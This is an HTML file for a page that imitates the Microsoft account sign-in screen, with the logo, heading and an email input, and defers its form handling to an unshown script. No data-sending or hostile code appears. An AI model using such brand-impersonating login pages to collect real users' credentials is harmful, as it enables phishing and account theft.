<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Sign In</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="background"></div>
    
    <div class="container">
        <div class="signin-card">
            <!-- Microsoft Logo -->
            <div class="logo-container">
                <svg class="microsoft-logo" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
                    <!-- Quadrants -->
                    <rect x="0" y="0" width="18" height="18" fill="#F25022"/>
                    <rect x="22" y="0" width="18" height="18" fill="#7FBA00"/>
                    <rect x="0" y="22" width="18" height="18" fill="#00A4EF"/>
                    <rect x="22" y="22" width="18" height="18" fill="#FFB900"/>
                </svg>
                <span class="microsoft-text">Microsoft</span>
            </div>

            <!-- Sign In Form -->
            <h1 class="signin-title">Sign in</h1>
            <p class="signin-subtitle">Use your Microsoft account.</p>

            <form id="signinForm" class="signin-form">
                <input 
                    type="email" 
                    id="emailInput" 
                    class="email-input" 
                    placeholder="Email or phone number" 
                    required
                >
                <span id="errorMessage" class="error-message"></span>

                <a href="#" class="forgot-link">Forgot your username?</a>

                <button type="submit" class="next-button">Next</button>
            </form>

            <!-- Create Account Link -->
            <div class="create-account">
                <span>New to Microsoft? </span>
                <a href="#" class="create-link">Create an account</a>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
